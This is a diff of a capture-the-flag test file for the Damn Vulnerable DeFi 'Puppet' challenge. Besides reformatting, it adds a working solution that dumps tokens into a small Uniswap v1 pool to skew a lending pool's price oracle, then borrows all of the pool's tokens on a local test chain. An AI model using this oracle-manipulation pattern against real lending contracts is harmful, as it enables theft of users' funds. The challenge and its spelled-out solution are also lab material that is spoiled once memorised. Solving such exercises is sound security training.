@@ -3,7 +3,7 @@ const { accounts, contract, web3 } = require('@openzeppelin/test-environment');
 const { expect } = require('chai');
 
 // Hacky way to easily get the Uniswap v1 contracts as artifacts
-// These were taken straight from https://github.com/Uniswap/uniswap-v1/tree/c10c08d81d6114f694baa8bd32f555a40f6264da/abi 
+// These were taken straight from https://github.com/Uniswap/uniswap-v1/tree/c10c08d81d6114f694baa8bd32f555a40f6264da/abi
 contract.artifactsDir = 'build-uniswap-v1';
 const UniswapExchange = contract.fromArtifact('UniswapV1Exchange');
 const UniswapFactory = contract.fromArtifact('UniswapV1Factory');
@@ -13,102 +13,98 @@ contract.artifactsDir = 'build/contracts';
 const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
 const PuppetPool = contract.fromArtifact('PuppetPool');
 
-
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
-    return tokensSold.mul(new BN('997')).mul(etherInReserve).div(
-        (tokensInReserve.mul(new BN('1000')).add(tokensSold.mul(new BN('997'))))
-    )
+	return tokensSold
+		.mul(new BN('997'))
+		.mul(etherInReserve)
+		.div(tokensInReserve.mul(new BN('1000')).add(tokensSold.mul(new BN('997'))));
 }
 
-describe('[Challenge] Puppet', function () {
-    const [deployer, attacker] = accounts;
+describe('[Challenge] Puppet', function() {
+	const [ deployer, attacker ] = accounts;
 
-    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
-    const UNISWAP_INITIAL_TOKEN_RESERVE = ether('10');
-    const UNISWAP_INITIAL_ETH_RESERVE = ether('10');
+	// Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
+	const UNISWAP_INITIAL_TOKEN_RESERVE = ether('10');
+	const UNISWAP_INITIAL_ETH_RESERVE = ether('10');
 
-    const POOL_INITIAL_TOKEN_BALANCE = ether('10000');
-    const ATTACKER_INITAL_TOKEN_BALANCE = ether('100');
+	const POOL_INITIAL_TOKEN_BALANCE = ether('10000');
+	const ATTACKER_INITAL_TOKEN_BALANCE = ether('100');
 
-    before(async function () {
-        /** SETUP SCENARIO */
+	before(async function() {
+		/** SETUP SCENARIO */
 
-        // Deploy token to be traded in Uniswap
-        this.token = await DamnValuableToken.new({ from: deployer });
+		// Deploy token to be traded in Uniswap
+		this.token = await DamnValuableToken.new({ from: deployer });
 
-        // Deploy a exchange that will be used as the factory template
-        this.exchangeTemplate = await UniswapExchange.new({from: deployer});
+		// Deploy a exchange that will be used as the factory template
+		this.exchangeTemplate = await UniswapExchange.new({ from: deployer });
 
-        // Deploy factory, initializing it with the address of the template exchange
-        this.uniswapFactory = await UniswapFactory.new({ from: deployer });
-        await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address, {from: deployer});
+		// Deploy factory, initializing it with the address of the template exchange
+		this.uniswapFactory = await UniswapFactory.new({ from: deployer });
+		await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address, { from: deployer });
 
-        // Create a new exchange for the token, and retrieve the deployed exchange's address
-        const { logs } = await this.uniswapFactory.createExchange(this.token.address, { from: deployer });
-        this.uniswapExchange = await UniswapExchange.at(logs[0].args.exchange);
+		// Create a new exchange for the token, and retrieve the deployed exchange's address
+		const { logs } = await this.uniswapFactory.createExchange(this.token.address, { from: deployer });
+		this.uniswapExchange = await UniswapExchange.at(logs[0].args.exchange);
 
-        // Deploy the lending pool
-        this.lendingPool = await PuppetPool.new(
-            this.token.address,
-            this.uniswapExchange.address,
-            { from: deployer }
-        );
-    
-        // Add initial token and ETH liquidity to the pool
-        await this.token.approve(
-            this.uniswapExchange.address,
-            UNISWAP_INITIAL_TOKEN_RESERVE,
-            { from: deployer }
-        );
-        const deadline = (await web3.eth.getBlock('latest')).timestamp * 2;
-        await this.uniswapExchange.addLiquidity(
-            0, // min_liquidity
-            UNISWAP_INITIAL_TOKEN_RESERVE,
-            deadline,
-            { from: deployer, value: UNISWAP_INITIAL_ETH_RESERVE }
-        );
+		// Deploy the lending pool
+		this.lendingPool = await PuppetPool.new(this.token.address, this.uniswapExchange.address, { from: deployer });
 
-        // Ensure Uniswap exchange is working as expected
-        expect(
-            await this.uniswapExchange.getTokenToEthInputPrice(ether('1'))
-        ).to.be.bignumber.eq(
-            calculateTokenToEthInputPrice(
-                ether('1'),
-                UNISWAP_INITIAL_TOKEN_RESERVE,
-                UNISWAP_INITIAL_ETH_RESERVE
-            )
-        );
+		// Add initial token and ETH liquidity to the pool
+		await this.token.approve(this.uniswapExchange.address, UNISWAP_INITIAL_TOKEN_RESERVE, { from: deployer }); //10
+		const deadline = (await web3.eth.getBlock('latest')).timestamp * 2;
+		await this.uniswapExchange.addLiquidity(
+			0, // min_liquidity
+			UNISWAP_INITIAL_TOKEN_RESERVE, // 10
+			deadline,
+			{ from: deployer, value: UNISWAP_INITIAL_ETH_RESERVE } //10
+		);
 
-        // Setup initial token balances of pool and attacker account
-        await this.token.transfer(attacker, ATTACKER_INITAL_TOKEN_BALANCE, { from: deployer });
-        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE, { from: deployer });
+		// Ensure Uniswap exchange is working as expected
+		// tokens_bought - return Amount of ETH that can be bought
+		expect(await this.uniswapExchange.getTokenToEthInputPrice(ether('1'))).to.be.bignumber.eq(
+			calculateTokenToEthInputPrice(ether('1'), UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
+		);
 
-        // Rate should be 1:1
-        expect(await this.lendingPool.computeOraclePrice()).to.be.bignumber.eq('1');
+		// Setup initial token balances of pool and attacker account
+		await this.token.transfer(attacker, ATTACKER_INITAL_TOKEN_BALANCE, { from: deployer }); //100
+		await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE, { from: deployer }); //10000
 
-        // Track attacker's initial ETH balance (to ensure it doesn't decrease)
-        this.intialAttackerEthBalance = await balance.current(attacker);
-    });
+		// Rate should be 1:1
+		expect(await this.lendingPool.computeOraclePrice()).to.be.bignumber.eq('1');
 
-    it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
-    });
+		// Track attacker's initial ETH balance (to ensure it doesn't decrease)
+		this.intialAttackerEthBalance = await balance.current(attacker);
+	});
 
-    after(async function () {
-        /** SUCCESS CONDITIONS */
-        
-        // Attacker has stolen all tokens from the pool
-        expect(
-            await this.token.balanceOf(attacker)
-        ).to.be.bignumber.gte(POOL_INITIAL_TOKEN_BALANCE);
-        expect(
-            await this.token.balanceOf(this.lendingPool.address)
-        ).to.be.bignumber.eq('0');
-        
-        // Attacker ETH balance has not decreased
-        expect(
-            await balance.current(attacker)
-        ).to.be.bignumber.gte(this.intialAttackerEthBalance);
-    });
+	it('Exploit', async function() {
+		/** YOUR EXPLOIT GOES HERE */
+		// enough to break the uniswap based oracle and to get the ETH needed to pay for gas fees
+		const amountswap = ether('1'); // 0.01 -10
+		//Set deadline to be more than 1.5
+		const deadline = (await web3.eth.getBlock('latest')).timestamp * 2;
+		const price1 = await this.lendingPool.computeOraclePrice();
+		//Approve Uniswap to use.
+		await this.token.approve(this.uniswapExchange.address, amountswap, { from: attacker });
+		// Amount of ERC20 tokens sold,Minimum ETH bought,deadline. return - Amount of ETH bought
+		await this.uniswapExchange.tokenToEthSwapInput(amountswap, 1, deadline, { from: attacker });
+		const price2 = await this.lendingPool.computeOraclePrice();
+
+		await this.lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, { from: attacker }); // 10000
+		console.log('Oracle initial value : ' + price1);
+		console.log('Oracle after swap value : ' + price2);
+	});
+	// Oracle price changed after the swap.
+
+	after(async function() {
+		/** SUCCESS CONDITIONS */
+
+		// Attacker has stolen all tokens from the pool
+		expect(await this.token.balanceOf(attacker)).to.be.bignumber.gte(POOL_INITIAL_TOKEN_BALANCE); // 10000
+		expect(await this.token.balanceOf(this.lendingPool.address)).to.be.bignumber.eq('0');
+
+		// Attacker ETH balance has not decreased
+		expect(await balance.current(attacker)).to.be.bignumber.gte(this.intialAttackerEthBalance);
+	});
 });
